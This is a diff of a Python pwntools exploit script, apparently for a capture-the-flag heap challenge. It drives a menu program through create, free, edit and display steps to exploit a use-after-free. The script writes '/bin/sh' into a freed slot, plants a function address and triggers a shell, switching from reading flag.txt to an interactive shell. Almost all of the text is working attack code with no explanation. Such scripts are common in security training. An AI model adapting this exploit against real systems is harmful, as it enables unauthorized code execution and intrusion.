@@ -28,13 +28,13 @@ b *0x00401207
 commands
 heap
 x/10wx 0x006020c0
-x/30wx *(0x006020c0+0x8)
-x/30wx *(0x006020c0+0x10)
+x/80wx *(0x006020c0+0x8)
+
 end
 
 c
 '''
-
+# x/40wx *(0x006020c0+0x28)
 #context.log_level ='debug'
 
 #universal flag finder, given a string
@@ -59,21 +59,89 @@ type_string = '1'
 type_array  = '2'
 
 
-def stage_0_create_and_free(target):
+def stage_00_create_and_free(target):
     #create a 10-byte string
     target.sendlineafter('> ',          cmd_create)
     target.sendlineafter('Type?',       type_string)
     target.sendlineafter('Length?',     str(10))
+    target.sendlineafter('Contents?',   'A'*8)
+
+    # #create a 10-byte string
+    # target.sendlineafter('> ',          cmd_create)
+    # target.sendlineafter('Type?',       type_string)
+    # target.sendlineafter('Length?',     str(10))
+    # target.sendlineafter('Contents?',   'B'*8)
+
+
+    #free the string
+    target.sendlineafter('> ',          cmd_delete)
+    target.sendlineafter('Index?',      str(0))
+
+    target.sendlineafter('> ',          cmd_edit)
+    target.sendlineafter('Index?',      str(0))
+    target.sendlineafter('Length?',     str(10))
     target.sendlineafter('Contents?',   '/bin/sh')
+
+
+    # #free the string
+    # target.sendlineafter('> ',          cmd_delete)
+    # target.sendlineafter('Index?',      str(1))
+
+    target.sendlineafter('> ', cmd_create)
+    target.sendlineafter('Type?', type_number)
+    target.sendlineafter('Value?',  str(0x004006e0))
+
+    return
+
+def stage_02_trigger_uaf(target):
+    #create a 10-byte string
+    target.sendlineafter('> ',          cmd_display)
+    target.sendlineafter('Index?',      str(0))
+    return
+
+def stage_0_create_and_free(target):
+    #create a 10-byte string
+    target.sendlineafter('> ',          cmd_create)
+    target.sendlineafter('Type?',       type_string)
+    target.sendlineafter('Length?',     str(40))
+    target.sendlineafter('Contents?',   'A'*30)
+
+    #create a 10-byte string
+    print target.sendlineafter('> ',          cmd_display)
+    print target.sendlineafter('Index?',      str(0))
+    print target.readline()
+    print target.readline()
 
     #free the string
     target.sendlineafter('> ',          cmd_delete)
     target.sendlineafter('Index?',      str(0))
 
     # create something else
+
     target.sendlineafter('> ', cmd_create)
     target.sendlineafter('Type?', type_number)
     target.sendlineafter('Value?',  str(0x004006e0))
+
+
+    target.sendlineafter('> ',          cmd_edit)
+    target.sendlineafter('Index?',      str(0))
+    target.sendlineafter('Length?',     str(20))
+    target.sendlineafter('Contents?',   '/bin/sh')
+
+    # #free the string
+    # target.sendlineafter('> ',          cmd_delete)
+    # target.sendlineafter('Index?',      str(2))
+    #
+    # target.sendlineafter('> ', cmd_create)
+    # target.sendlineafter('Type?', type_number)
+    # target.sendlineafter('Value?',  str('/bin/sh'))
+    #
+
+
+    # target.sendlineafter('> ',          cmd_create)
+    # target.sendlineafter('Type?',       type_string)
+    # target.sendlineafter('Length?',     str(4))
+    # target.sendlineafter('Contents?',   'C'*4)
     return
 
 
@@ -81,8 +149,8 @@ def stage_1_do_some_stuff(target):
     #create something
     target.sendlineafter('> ',          cmd_create)
     target.sendlineafter('Type?',       type_string)
-    target.sendlineafter('Length?',     str(10))
-    target.sendlineafter('Contents?',      str(0x61616161))
+    target.sendlineafter('Length?',     str(4))
+    target.sendlineafter('Contents?',      'B'*4)
 
     # create something else
     target.sendlineafter('> ',          cmd_create)
@@ -93,21 +161,22 @@ def stage_1_do_some_stuff(target):
 
 def stage_2_trigger_uaf(target):
     #create a 10-byte string
-    print target.sendlineafter('> ',          cmd_display)
-    print target.sendlineafter('Index?',      str(0))
+    target.sendlineafter('> ',          cmd_display)
+    target.sendlineafter('Index?',      str(0))
     return
 
 
 def solve(target):
-    stage_0_create_and_free(target)
+    stage_00_create_and_free(target)
     # target.interactive()
     #
-    # stage_1_do_some_stuff(target)
-    stage_2_trigger_uaf(target)
+    #stage_1_do_some_stuff(target)
+    stage_02_trigger_uaf(target)
 
-    print target.readline()
-    target.sendline('cat flag.txt')
-    return target.readline()
+    target.interactive()
+    # print target.readline()
+    # target.sendline('cat flag.txt')
+    # return target.readline()
 
 
 #universal target setup for remote-only
